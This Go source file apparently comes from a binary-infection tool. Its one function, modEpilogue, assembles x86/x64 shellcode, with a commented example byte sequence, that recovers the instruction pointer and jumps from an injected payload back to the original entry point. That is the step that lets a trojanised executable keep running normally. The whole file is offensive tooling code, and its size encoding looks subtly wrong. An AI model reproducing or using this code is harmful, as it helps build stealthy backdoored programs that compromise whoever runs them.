package main

import(
	"encoding/binary"
	"bytes"
)

/*
	x64 - pEntry uint64 / oEntry uint64
	x86 - pEntry uint32 / oEntry uint32
*/
func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
	/*
	;Example of what the final payload can look like
	epilog := []byte{
		0xe8, 0x12, 0x00, 0x00, 0x00, 		//call   401061 <get_eip>
		0x48, 0x83, 0xe8, 0x4f, 			//sub    $0x4f,%rax
		0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
		0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
		0xff, 0xe0, 						//jmp    *%rax
											//0000000000401061 <get_eip>:
		0x48, 0x8b, 0x04, 0x24, 			//mov    (%rsp),%rax
		0xc3, 								//ret
	}
	*/

	encPsize := make([]byte, 4)
	binary.LittleEndian.PutUint32(encPsize, uint32(pSize))
	var numZeros uint32 = 0 
	for _, b := range encPsize {
		if b != 0x00 {
			numZeros++
		}
	}

	var incOff uint32
	switch pEntry.(type) {
	case uint64:
		incOff = 0x12 
	case uint32:
		incOff = 0xf
	}
	incOff += (numZeros - 1)

	var shellcode bytes.Buffer;
	shellcode.Write([]byte{0xe8}) //call instruction
	
	//encode the offset
	encOff := make([]byte, 4)
	binary.LittleEndian.PutUint32(encOff, incOff)

	//write offset for call instruction
	shellcode.Write(encOff)

	// (x64) - sub rax, encPsize
	// (x86) - sub eax, encPsize
	switch oEntry.(type) {
	case uint64:
		shellcode.Write([]byte{0x48, 0x83, 0xe8})
	case uint32:
		shellcode.Write([]byte{0x83, 0xe8})
	} 
	shellcode.Write(encPsize[:numZeros])
	
	//	(x64) - sub rax, pEntry
	//	(x86) - sub eax, pEntry
	encPentry := make([]byte, 4)
	switch v := pEntry.(type) {
	case uint64:
		binary.LittleEndian.PutUint32(encPentry, uint32(v))
		shellcode.Write([]byte{0x48, 0x2d})
	case uint32:
		binary.LittleEndian.PutUint32(encPentry, v)
		shellcode.Write([]byte{0x2d})
	}
	shellcode.Write(encPentry)

	// (x64) - add rax, oEntry
	// (x86) - add eax, oEntry
	encOentry := make([]byte, 4)
	switch v := oEntry.(type) {
	case uint64:
		binary.LittleEndian.PutUint32(encOentry, uint32(v))
		shellcode.Write([]byte{0x48, 0x05})
	case uint32:
		binary.LittleEndian.PutUint32(encOentry, v)
		shellcode.Write([]byte{0x05})
	}
	shellcode.Write(encOentry)

	switch oEntry.(type) {
	case uint64:
		/* --- write -- */
		//jmp rax
		//mov rax, [rsp]
		//ret
		shellcode.Write([]byte{0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3})
	case uint32:
		/* --- write -- */
		//jmp eax
		//mov eax, [esp]
		//ret
		shellcode.Write([]byte{0xff, 0xe0, 0x8b, 0x04, 0x24, 0xc3})
	}
	return shellcode.Bytes()
}